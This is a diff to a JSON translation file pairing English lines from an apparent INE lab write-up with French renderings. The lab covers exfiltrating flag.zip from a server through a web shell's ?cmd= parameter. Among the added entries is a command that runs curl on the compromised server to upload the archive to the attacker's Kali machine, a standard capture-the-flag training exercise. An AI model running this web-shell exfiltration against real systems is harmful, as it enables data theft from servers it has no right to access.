@@ -5,9 +5,24 @@
     "translation": "L’interface graphique de Kali est hébergée sur le site INE :"
   },
   {
+    "line": 5,
+    "source": "* You have exploited a vulnerable API endpoint and overwritten it with malicious code. This modification allows you to run commands on the server machine hosting the API, as a _low privilege user_ (i.e. student). A sensitive flag file is kept in a zipped archive file in the _student user's home directory_.",
+    "translation": "* Un endpoint API vulnérable a été exploité et écrasé par du code malveillant. Cette modification permet d’exécuter des commandes sur le serveur qui héberge l’API, avec un _utilisateur non privilégié_ (student). Un fichier contenant un flag sensible est conservé dans une archive ZIP, dans le _répertoire personnel de l’utilisateur student_."
+  },
+  {
+    "line": 6,
+    "source": "* There is a monitor process running on the server machine that blocks most protocols _except HTTP protocol_ (when using port **80**).",
+    "translation": "* Un processus de surveillance s’exécute sur le serveur et bloque la plupart des protocoles, _à l’exception de HTTP_ (sur le port **80**)."
+  },
+  {
     "line": 7,
     "source": "* The API endpoint is accessible at `demo.ine.local` domain.",
     "translation": "* Le point d’accès API est accessible via le domaine `demo.ine.local`."
+  },
+  {
+    "line": 9,
+    "source": "_Objective_: Transfer the zipped archive to your Kali machine using HTTP protocol and retrieve the flag!",
+    "translation": "_Objectif_ : transférer l’archive ZIP vers la machine Kali via HTTP et récupérer le flag !"
   },
   {
     "line": 11,
@@ -25,8 +40,158 @@
     "translation": "* Scripts Python"
   },
   {
+    "line": 19,
+    "source": "*   Check Kali instance IP address and ping the vulnerable server.",
+    "translation": "*   Vérifier l’adresse IP de l’instance Kali et envoyer un ping au serveur vulnérable."
+  },
+  {
     "line": 39,
     "source": "* The web server IP is `192.70.33.3`",
     "translation": "* L’adresse IP du serveur Web est `192.70.33.3`."
+  },
+  {
+    "line": 43,
+    "source": "*   Perform an `nmap` scan to check open ports on the server:",
+    "translation": "*   Effectuer un scan `nmap` pour identifier les ports ouverts sur le serveur :"
+  },
+  {
+    "line": 45,
+    "source": "    *   _Simple scan_:",
+    "translation": "    *   _Scan simple_ :"
+  },
+  {
+    "line": 64,
+    "source": "*   _Advanced scan_:",
+    "translation": "*   _Scan avancé_ :"
+  },
+  {
+    "line": 70,
+    "source": "**`-sC`** - for default scripts",
+    "translation": "**`-sC`** : utiliser les scripts par défaut"
+  },
+  {
+    "line": 71,
+    "source": "**`-sV`** - probe open ports to determine service/versions info",
+    "translation": "**`-sV`** : examiner les ports ouverts pour identifier les services et leurs versions"
+  },
+  {
+    "line": 72,
+    "source": "**`-oA`** - output all 3 major formats in a directory",
+    "translation": "**`-oA`** : enregistrer les résultats dans les 3 principaux formats, dans un répertoire"
+  },
+  {
+    "line": 90,
+    "source": "- A Python2 web server (Werkzeug) is running on open port **8000**.",
+    "translation": "- Un serveur Web Python2 (Werkzeug) fonctionne sur le port ouvert **8000**."
+  },
+  {
+    "line": 91,
+    "source": "- Check the response from a browser by visiting `http://demo.ine.local:8000/`",
+    "translation": "- Vérifier la réponse depuis un navigateur en accédant à `http://demo.ine.local:8000/`"
+  },
+  {
+    "line": 97,
+    "source": "* Pass a parameter named `cmd` with the URL, using `?cmd=VALUE` in the URL:",
+    "translation": "* Transmettre un paramètre nommé `cmd` dans l’URL, avec `?cmd=VALUE` :"
+  },
+  {
+    "line": 102,
+    "source": "* **`http://demo.ine.local:8000/?cmd=ls+-l`** - check contents of pwd:",
+    "translation": "* **`http://demo.ine.local:8000/?cmd=ls+-l`** : examiner le contenu du répertoire courant :"
+  },
+  {
+    "line": 106,
+    "source": "* _flag.zip_ file must be transferred to the Kali instance.",
+    "translation": "* Le fichier _flag.zip_ doit être transféré vers l’instance Kali."
+  },
+  {
+    "line": 107,
+    "source": "* Check if `curl` command is present on the server",
+    "translation": "* Vérifier si la commande `curl` est disponible sur le serveur"
+  },
+  {
+    "line": 108,
+    "source": "  * **`http://demo.ine.local:8000/?cmd=curl+-h`** - curl is present:",
+    "translation": "  * **`http://demo.ine.local:8000/?cmd=curl+-h`** : curl est disponible :"
+  },
+  {
+    "line": 112,
+    "source": "* `curl` can be used to exfiltrate the flag.zip file by sending it over HTTP protocol to a local HTTP server on the Kali instance, using the **`-T`** option:",
+    "translation": "* `curl` peut servir à exfiltrer le fichier flag.zip en l’envoyant via HTTP à un serveur HTTP local sur l’instance Kali, avec l’option **`-T`** :"
+  },
+  {
+    "line": 114,
+    "source": "> \\-T, --upload-file This transfers the specified local file to the remote URL. If there is no file part in the specified URL, curl will append the local file name. NOTE that you must use a trailing / on the last directory to really prove to Curl that there is no file name or curl will think that your last directory name is the remote file name to use. That will most likely cause the upload oper‐ ation to fail. If this is used on an HTTP(S) server, the PUT command will be used.",
+    "translation": "> \\-T, --upload-file Transfère le fichier local indiqué vers l’URL distante. Si aucun nom de fichier n’est indiqué dans l’URL, curl ajoute le nom du fichier local. NOTE : un / final doit suivre le dernier répertoire pour indiquer à curl qu’aucun nom de fichier n’est fourni. Sinon, curl considère le nom du dernier répertoire comme le nom du fichier distant. Le téléversement risque alors d’échouer. Si cette option est utilisée avec un serveur HTTP(S), la méthode PUT est employée."
+  },
+  {
+    "line": 118,
+    "source": "* Run a HTTP server on the local machine using python:",
+    "translation": "* Lancer un serveur HTTP sur la machine locale avec Python :"
+  },
+  {
+    "line": 125,
+    "source": "  * The Kali instance IP is `192.70.33.2`",
+    "translation": "  * L’adresse IP de l’instance Kali est `192.70.33.2`"
+  },
+  {
+    "line": 127,
+    "source": "  * _Error response - Unsupported method ('PUT')_",
+    "translation": "  * _Réponse d’erreur : méthode non prise en charge ('PUT')_"
+  },
+  {
+    "line": 131,
+    "source": "* (Same error with **`python3 -m http.server 80`**)",
+    "translation": "* (Même erreur avec **`python3 -m http.server 80`**)"
+  },
+  {
+    "line": 132,
+    "source": "*   Create a Python script to run an _HTTP server supporting PUT_.",
+    "translation": "*   Créer un script Python pour lancer un _serveur HTTP prenant en charge PUT_."
+  },
+  {
+    "line": 141,
+    "source": "- Add the following code to the htttserver.py script:",
+    "translation": "- Ajouter le code suivant au script htttserver.py :"
+  },
+  {
+    "line": 160,
+    "source": "> _Thanks to_ [_BigBlueHat_](https://gist.github.com/BigBlueHat/0ca3894f715aac2f2e40af3a8aa0a436) _for the script._",
+    "translation": "> _Merci à_ [_BigBlueHat_](https://gist.github.com/BigBlueHat/0ca3894f715aac2f2e40af3a8aa0a436) _pour le script._"
+  },
+  {
+    "line": 162,
+    "source": "* Run the SimpleHTTP server using the script:",
+    "translation": "* Lancer le serveur SimpleHTTP avec le script :"
+  },
+  {
+    "line": 168,
+    "source": "* Try again the PUT request `http://demo.ine.local:8000/?cmd=curl+192.70.33.2+-T+flag.zip`",
+    "translation": "* Réessayer la requête PUT `http://demo.ine.local:8000/?cmd=curl+192.70.33.2+-T+flag.zip`"
+  },
+  {
+    "line": 169,
+    "source": "  * Archive `flag.zip` was received by the server.",
+    "translation": "  * L’archive `flag.zip` a été reçue par le serveur."
+  },
+  {
+    "line": 173,
+    "source": "* Stop the running HTTP server and check the folder for the downloaded file.",
+    "translation": "* Arrêter le serveur HTTP et vérifier la présence du fichier téléchargé dans le répertoire."
+  },
+  {
+    "line": 181,
+    "source": "* Unzip the archive and retrieve the flag:",
+    "translation": "* Décompresser l’archive et récupérer le flag :"
+  },
+  {
+    "line": 190,
+    "source": "> 📍 Lab solved!",
+    "translation": "> 📍 Laboratoire terminé !"
+  },
+  {
+    "line": 192,
+    "source": "> 📌 Check [An Introduction to Web Shells - by Acunetix](https://www.acunetix.com/blog/articles/introduction-web-shells-part-1/)",
+    "translation": "> 📌 Consulter [Introduction aux Web Shells, par Acunetix](https://www.acunetix.com/blog/articles/introduction-web-shells-part-1/)"
   }
 ]
